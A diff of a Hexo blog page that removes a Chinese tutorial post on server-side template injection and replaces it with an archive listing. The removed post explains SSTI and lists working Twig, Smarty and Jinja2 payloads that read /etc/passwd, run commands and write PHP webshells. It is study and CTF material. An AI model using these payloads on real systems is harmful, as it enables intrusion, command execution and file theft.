@@ -6,19 +6,15 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>ssti | 佘雅晴のblog</title>
+  <title>Archives: 2025/5 | 佘雅晴のblog</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="ssti模板注入漏洞成因：服务端接收了用户的恶意输入后，未经任何处理就将其作为web应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露，代码执行，GetShell等问题。其影响范围主要取决于模板引擎的复杂性。 同常规的 SQL 注入检测，XSS 检测一样，模板注入漏洞的检测也是向传递的参数中承载特定 Payload 并根据返回的">
-<meta property="og:type" content="article">
-<meta property="og:title" content="ssti">
-<meta property="og:url" content="http://example.com/2025/04/26/ssti/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="佘雅晴のblog">
+<meta property="og:url" content="http://example.com/archives/2025/05/index.html">
 <meta property="og:site_name" content="佘雅晴のblog">
-<meta property="og:description" content="ssti模板注入漏洞成因：服务端接收了用户的恶意输入后，未经任何处理就将其作为web应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露，代码执行，GetShell等问题。其影响范围主要取决于模板引擎的复杂性。 同常规的 SQL 注入检测，XSS 检测一样，模板注入漏洞的检测也是向传递的参数中承载特定 Payload 并根据返回的">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2025-04-26T04:59:47.000Z">
-<meta property="article:modified_time" content="2025-04-26T08:55:58.459Z">
 <meta property="article:author" content="snake&#39;blog">
 <meta name="twitter:card" content="summary">
   
@@ -211,222 +207,54 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-ssti" class="article article-type-post " itemscope itemprop="blogPost">
-  <div class="article-inner">
+            
+  
+  
     
-      <header class="article-header">
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2025" class="archive-year">2025</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	
+<a href="/2025/05/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="archive-article-date">
+        <time datetime="2025-05-01T10:10:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-05-01</time>
+</a>
+
+        </div>
+    	 
   
+    <h1 itemprop="name">
+	
+	  <a class="archive-article-title" href="/2025/05/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" target="_blank">文件包含</a>
   
-    <h1 class="article-title" itemprop="name">
-      ssti
     </h1>
   
 
 
-  
-  
-        
-        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
-              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
-        </span>
+        <div class="article-info info-on-right">
+          
+          
 
-<a href="/2025/04/26/ssti/" class="archive-article-date">
-        <time datetime="2025-04-26T04:59:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-04-26</time>
-</a>
-
-  
-  
-    
-<div style="margin-top:10px;">
-  <span class="post-time">
-    <span class="post-meta-item-icon">
-      <!-- fonts.scss -->
-      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
-      <i class="icon-statistics"></i>
-      <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">1.9k字</span>
-    </span>
-  </span>
-
-  <span class="post-time">
-    &nbsp; | &nbsp;
-    <span class="post-meta-item-icon">
-      <i class="icon-book icon"></i>
-      <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">8分</span>
-    </span>
-  </span>
-</div>
-
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h1 id="ssti模板注入"><a href="#ssti模板注入" class="headerlink" title="ssti模板注入"></a>ssti模板注入</h1><h3 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h3><p>服务端接收了用户的恶意输入后，未经任何处理就将其作为web应用模板内容的一部分，模板引擎<strong>在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句</strong>，因而可能导致了敏感信息泄露，代码执行，GetShell等问题。其影响范围主要取决于模板引擎的复杂性。</p>
-<p>同常规的 SQL 注入检测，XSS 检测一样，模板注入漏洞的检测也是向传递的参数中承载特定 Payload 并根据返回的内容来进行判断的。</p>
-<p>凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。</p>
-<span id="more"></span>
-
-<p><strong>模板引擎？</strong></p>
-<p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。</p>
-<p>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。</p>
-<h2 id="php中的ssti"><a href="#php中的ssti" class="headerlink" title="php中的ssti"></a>php中的ssti</h2><p><strong>php常见的模板：twig，smarty，blade</strong></p>
-<h3 id="1-Twig"><a href="#1-Twig" class="headerlink" title="1.Twig"></a>1.Twig</h3><p>Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。</p>
-<p>例：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">　　require_once dirname(__FILE__).&#x27;\twig\lib\Twig\Autoloader.php&#x27;;</span><br><span class="line">　　Twig_Autoloader::register(true);</span><br><span class="line">　　$twig = new Twig_Environment(new Twig_Loader_String());</span><br><span class="line">　　$output = $twig-&gt;render(&quot;Hello &#123;&#123;name&#125;&#125;&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;]));  // 将用户输入作为模版变量的值</span><br><span class="line">　　echo $output;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>当你认为这里可能出现XSS而构造payload：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>时由于模板一般默认对渲染的变量值进行编码和转义，所以不会造成跨站脚本攻击。</p>
-<p>但是将模板修改：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$output=$twig-&gt;render(&quot;Hello &#123;$_GET[&#x27;name&#x27;]&#125;&quot;);// 将用户输入作为模版内容的一部分</span><br></pre></td></tr></table></figure>
-
-<p>这是XSS就奏效。</p>
-<p>同样，若构造payload：<code>snake &#123;&#123;2*3&#125;&#125; OK</code>，则返回<code>Hello snake6OK</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;# comment #&#125;：Twig模板引擎的默认注释形式</span><br><span class="line">&#123;&#123;2*3&#125;&#125;：模板变量最终返回6作为其值显示</span><br></pre></td></tr></table></figure>
-
-<p>如果在web页面的源代码中看到了诸如以下的字符，就可以推断网站使用了某些模板引擎来呈现数据</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;&#123;$what&#125;&lt;/div&gt;</span><br><span class="line">&lt;p&gt;Welcome, &#123;&#123;username&#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;div&gt;&#123;%$a%&#125;&lt;/div&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<p>针对Twig新增的filter和map等内容补充一些payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;/etc/passwd&#x27;|file_excerpt(1,30)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;app.request.files.get(1).__construct(&#x27;/etc/passwd&#x27;,&#x27;&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;app.request.files.get(1).openFile.fread(99)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;whoami&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.enableDebug()&#125;&#125;&#123;&#123;_self.env.isDebug()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;]|map(&quot;system&quot;)|join(&quot;,&quot;)</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#123;&quot;&lt;?php phpinfo();&quot;:&quot;/var/www/html/shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;,0]|sort(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;]|filter(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[0,0]|reduce(&quot;system&quot;,&quot;id&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&#x27;cat /etc/passwd&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-Smarty"><a href="#2-Smarty" class="headerlink" title="2.Smarty"></a>2.Smarty</h3><p>Smarty是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数(相当于存在了一个disable_function)</p>
-<p><strong>没关系！$smarty内置变量可用于访问各种环境变量</strong></p>
-<p>上payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if标签执行php命令：</span><br><span class="line">&#123;if system(&#x27;cat/flag&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">读文件：</span><br><span class="line">&#123;self::getStreamVariable(&quot;file:///etc/passwd&quot;)&#125;</span><br><span class="line">写个webshell：</span><br><span class="line">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;,self::clearConfig())&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Python中的ssti"><a href="#Python中的ssti" class="headerlink" title="Python中的ssti"></a>Python中的ssti</h2><h3 id="1-jinja2"><a href="#1-jinja2" class="headerlink" title="1.jinja2"></a>1.jinja2</h3><p>Jinja2是Flask框架的一部分。Jinja2会把模板参数提供的相应的值替换了  块</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">控制结构：&#123;% %&#125;</span><br><span class="line">变量取值：&#123;&#123; &#125;&#125;</span><br><span class="line">注释：&#123;# #&#125;</span><br></pre></td></tr></table></figure>
-
-<p>由于在jinja2中是可以直接访问python的一些对象及其方法的，所以可以通过构造继承链来执行一些操作，比如文件读取，命令执行等：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__dict__　　 ：保存类实例或对象实例的属性变量键值对字典</span><br><span class="line">__class__　　：返回一个实例所属的类</span><br><span class="line">__mro__　　  ：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__bases__　　：以元组形式返回一个类直接所继承的类（可以理解为直接父类）</span><br><span class="line">__base__　　 ：和上面的bases大概相同，都是返回当前类所继承的类，即基类，区别是base返回单个，bases返回是元组</span><br><span class="line">// __base__和__mro__都是用来寻找基类的</span><br><span class="line">__subclasses__　　：以列表返回类的子类</span><br><span class="line">__init__　　 ：类的初始化方法</span><br><span class="line">__globals__　　   ：对包含函数全局变量的字典的引用</span><br><span class="line">__builtin__&amp;&amp;__builtins__　　：python中可以直接运行一些函数，例如int()，list()等等。　　　　　　　　　　　　　　　　　　</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">这些函数可以在__builtin__可以查到。查看的方法是dir(__builtins__)　　　　　　　　　　　　　　　　　　</span><br><span class="line">在py3中__builtin__被换成了builtin　　　　　　　　　　　　　　　　　　</span><br><span class="line">1.在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__。　　　　　　　　　　　　　　　　　　2.非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>基础payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">获得基类</span><br><span class="line">#python2.7</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[2]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[1]</span><br><span class="line">#python3.7</span><br><span class="line">&#x27;&#x27;.__。。。class__.__mro__[1]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[1]</span><br><span class="line"></span><br><span class="line">#python 2.7</span><br><span class="line">#文件操作</span><br><span class="line">#找到file类</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40]</span><br><span class="line">#读文件</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()</span><br><span class="line">#写文件</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40](&#x27;/tmp&#x27;).write(&#x27;test&#x27;)</span><br><span class="line"></span><br><span class="line">#命令执行</span><br><span class="line">#os执行</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache下有os类，可以直接执行命令：</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;id&#x27;).read()</span><br><span class="line">#eval,impoer等全局函数</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;id&#x27;).read()</span><br><span class="line"></span><br><span class="line">#python3.7</span><br><span class="line">#命令执行</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">#文件操作</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;filename&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">#windows下的os命令</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__[&#x27;popen&#x27;](&#x27;dir&#x27;).read()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>典型例题wp：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Article-kelp/p/14797393.html#questionOne">https://www.cnblogs.com/Article-kelp/p/14797393.html#questionOne</a></p>
-
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-
-    
-    
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <!-- <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a> -->
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
         </div>
-      </div>
-    </span>
-  </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2025/04/26/ssti/" alt="微信分享二维码"> -->
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-
-    
-    <div class="clearfix"></div>
-  </div>
+        <div class="clearfix"></div>
+    </header>
   </div>
 </article>
-
-
-<nav id="article-nav">
-  
-    <a href="/2025/05/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          文件包含
-        
-      </div>
-    </a>
   
   
-    <a href="/2025/04/11/RCE/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">RCE</div>
-      <i class="icon-circle-right"></i>
-    </a>
+    </div></section>
   
-</nav>
 
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-
-
-
-
-
-
-
-
+    
 
 
           </div>
@@ -467,8 +295,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: true,
-		isArchive: false,
+		isPost: false,
+		isArchive: true,
 		isTag: false,
 		isCategory: false,
 		open_in_new: true,
